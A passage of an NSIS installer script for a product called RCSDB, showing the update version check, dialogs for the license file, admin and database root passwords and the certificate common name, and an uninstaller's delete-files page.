   ${If} $insttype == ${SETUP_UPDATE}
      FileOpen $0 "$INSTDIR\VERSION" r
      FileRead $0 $1 10
      FileClose $0
      StrCpy $oldver $1

      ${Switch} $oldver
         ${Case} 2010011901   ;RCS-6.0.0
         ${Case} 2010031201   ;RCS-6.1.0
         ${Case} 2010061101   ;RCS-6.2.0
         ${Case} 2010073101   ;RCS-6.2.1
         ${Case} 2010091001   ;RCS-6.2.2
         ${Case} 2010103101   ;RCS-7.0.0
         ${Case} 2011011101   ;RCS-7.1.0
         ${Case} 2011032101   ;RCS-7.2.0
         ${Case} ${PACKAGE_VERSION}   ;CURRENT
            MessageBox MB_YESNO|MB_ICONQUESTION "Do you want to update ${PACKAGE_NAME}?$\nWARNING! Please backup before update!" IDYES +2 IDNO 0
               Quit
            ${Break}
         ${Default}
            MessageBox MB_OK|MB_ICONSTOP "Unsupported ${PACKAGE_NAME} version ($oldver)"
            Quit
      ${EndSwitch}
   ${EndIf}

   StrCpy $inifile "$INSTDIR\etc\RCSDB.ini"

   Return

FunctionEnd

Function FuncConfigureLicense

   !insertmacro MUI_HEADER_TEXT "Configuration settings: License" "Please enter configuration settings."

   nsDialogs::Create /NOUNLOAD 1018

   ${NSD_CreateLabel} 0 5u 100% 10u "License file:"
   ${NSD_CreateLabel} 5u 17u 40u 10u "License:"
   ${NSD_CreateFileRequest} 50u 15u 145u 12u ""
   Pop $licensectrl
   ${NSD_CreateBrowseButton} 200u 15u 50u 12u "Browse..."
   Pop $0
   GetFunctionAddress $1 BrowseClickFunction
   nsDialogs::OnClick /NOUNLOAD $0 $1

   ${NSD_SetFocus} $licensectrl
   nsDialogs::Show

   Return

FunctionEnd

Function FuncConfigureLicenseLeave

   ${NSD_GetText} $licensectrl $license

   StrCmp $license "" 0 +3
      MessageBox MB_OK|MB_ICONSTOP "License file cannot be empty"
      Abort

   IfFileExists $license +3 0
      MessageBox MB_OK|MB_ICONSTOP "Cannot read license file"
      Abort

   Return

FunctionEnd

Function FuncConfigureUsers

   ${If} $insttype == ${SETUP_UPDATE}
      Abort
   ${EndIf}

   !insertmacro MUI_HEADER_TEXT "Configuration settings: Users" "Please enter configuration settings."

   nsDialogs::Create /NOUNLOAD 1018

   ${NSD_CreateLabel} 0 5u 100% 10u "Password for user 'admin':"
   ${NSD_CreateLabel} 5u 17u 40u 10u "Password:"
   ${NSD_CreatePassword} 50u 15u 200u 12u ""
   Pop $adminpassctrl
   ${NSD_CreateLabel} 5u 32u 40u 10u "Confirm:"
   ${NSD_CreatePassword} 50u 30u 200u 12u ""
   Pop $adminpassconfirmctrl

   ${NSD_SetFocus} $adminpassctrl
   nsDialogs::Show

   Return

FunctionEnd

Function FuncConfigureUsersLeave

   ${NSD_GetText} $adminpassctrl $adminpass
   ${NSD_GetText} $adminpassconfirmctrl $adminpassconfirm

   StrCmp $adminpass "" 0 +3
      MessageBox MB_OK|MB_ICONSTOP "Password for user 'admin' cannot be empty"
      Abort

   StrCmp $adminpass $adminpassconfirm +3 0
      MessageBox MB_OK|MB_ICONSTOP "Password for user 'admin' doesn't match"
      Abort

   ${StrFilter} $adminpass "12" "" "" $0
   StrCmp $0 $adminpass +3 0
      MessageBox MB_OK|MB_ICONSTOP "Password for user 'admin' can only contain alphanumeric characters"
      Abort

   Return

FunctionEnd

Function FuncConfigureDb

   ${If} $insttype == ${SETUP_UPDATE}
      Abort
   ${EndIf}

   !insertmacro MUI_HEADER_TEXT "Configuration settings: Database" "Please enter configuration settings."

   nsDialogs::Create /NOUNLOAD 1018

   ${NSD_CreateLabel} 0 5u 100% 10u "Database root password (for system administration purpose only):"
   ${NSD_CreateLabel} 5u 17u 40u 10u "Password:"
   ${NSD_CreatePassword} 50u 15u 200u 12u ""
   Pop $dbrootpassctrl
   ${NSD_CreateLabel} 5u 32u 40u 10u "Confirm:"
   ${NSD_CreatePassword} 50u 30u 200u 12u ""
   Pop $dbrootpassconfirmctrl

   ${NSD_SetFocus} $dbrootpassctrl
   nsDialogs::Show

   Return

FunctionEnd

Function FuncConfigureDbLeave

   ${NSD_GetText} $dbrootpassctrl $dbrootpass
   ${NSD_GetText} $dbrootpassconfirmctrl $dbrootpassconfirm

   StrCmp $dbrootpass "" 0 +3
      MessageBox MB_OK|MB_ICONSTOP "Database root password cannot be empty"
      Abort

   StrCmp $dbrootpass $dbrootpassconfirm +3 0
      MessageBox MB_OK|MB_ICONSTOP "Database root password doesn't match"
      Abort

   ${StrFilter} $dbrootpass "12" "" "" $0
   StrCmp $0 $dbrootpass +3 0
      MessageBox MB_OK|MB_ICONSTOP "Database root password can only contain alphanumeric characters"
      Abort

   Return

FunctionEnd

Function FuncConfigureCert

   ${If} $insttype == ${SETUP_UPDATE}
      Abort
   ${EndIf}

   !insertmacro MUI_HEADER_TEXT "Configuration settings: Certificate" "Please enter configuration settings."

   nsDialogs::Create /NOUNLOAD 1018

   ${NSD_CreateLabel} 0 5u 100% 10u "Certificate CN (hostname or IP address of RCSDB):"
   ${NSD_CreateLabel} 5u 17u 40u 10u "CN:"
   ${NSD_CreateText} 50u 15u 200u 12u ""
   Pop $certcnctrl

   ${NSD_SetFocus} $certcnctrl
   nsDialogs::Show

   Return

FunctionEnd

Function FuncConfigureCertLeave

   ${NSD_GetText} $certcnctrl $certcn

   StrCmp $certcn "" 0 +3
      MessageBox MB_OK|MB_ICONSTOP "Certificate CN cannot be empty"
      Abort

   ${StrFilter} $certcn "12" "-." "" $0
   StrCmp $0 $certcn +3 0
      MessageBox MB_OK|MB_ICONSTOP "Certificate CN can only contain alphanumeric characters, hyphens and dots"
      Abort

   Return

FunctionEnd

Function BrowseClickFunction

   nsDialogs::SelectFileDialog /NOUNLOAD open "" "License files (*.lic)|*.lic"
   Pop $0

   SendMessage $licensectrl ${WM_SETTEXT} 0 STR:$0

   Return

FunctionEnd

Function un.FuncDeleteFiles

   !insertmacro MUI_HEADER_TEXT "Uninstalling" "Delete files and data."

   nsDialogs::Create /NOUNLOAD 1018

   ${NSD_CreateCheckBox} 20u 5u 200u 12u "Delete all files and data"
   Pop $deletefilesctrl

   ${NSD_Check} $deletefilesctrl

   ${NSD_SetFocus} $deletefilesctrl
   nsDialogs::Show

   Return

FunctionEnd

Function un.FuncDeleteFilesLeave

   ${NSD_GetState} $deletefilesctrl $deletefiles

   Return

FunctionEnd
